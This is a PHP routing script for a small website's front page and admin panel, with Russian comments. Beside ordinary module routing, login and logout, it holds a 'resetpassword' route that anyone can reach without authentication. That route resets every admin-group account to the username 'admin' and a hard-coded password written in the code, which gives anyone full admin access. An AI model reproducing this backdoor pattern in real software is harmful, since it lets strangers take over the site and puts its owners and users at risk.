<?
$scrname=$_SERVER['SCRIPT_NAME']; if($scrname!='/index.php') { exit;}
$tag=0;
$inc='templ.php';

//авторизация в админ панель
if($uri[1]=='login'){
	$tag=1;
	$inc=(!$admin_id) ? 'login_form.php' : 'admmenu.php';
}
//сброс пароля
if($uri[1]=='resetpassword'){
	$pas=password_hash('Almaty#2019',PASSWORD_DEFAULT);
	$conn->query("update u set user='admin', pass='$pas' where user_group=1");
	header("location: /login/");
}

//выход из админ панели
if($uri[1]=='exit'){ 
	unset($_SESSION["admin_id"]); 
	header("location: /login/"); return;
} 

//зависимости от УРК выбираем модуль
$a_modul=array('main_page'=>'mainpage.php','news'=>'news.php','gallery'=>'gallery.php',
 'appeal'=>'appeal.php','calendar'=>'calendar.php','review'=>'otziv.php','contacts'=>'contacts.php',
 'testimonials'=>'testimonials.php', 'video'=>'video.php'
);
if(!$tag){
	//если адресная строка пустая то по умолчанию загружается главная страница
	$mod=(!$uri[2]) ? "main_page": $uri[2];
	//проверям на модуль
	$inc_m=($a_modul[$mod]) ? $a_modul[$mod] : "page.php";

	//подключаем модуль в кеш
	ob_start();
	if(file_exists($inc_m)){ include $inc_m; }
	$html_body=ob_get_clean();
}

//подключить модуль по условиям
if($inc){ include $inc; }
?>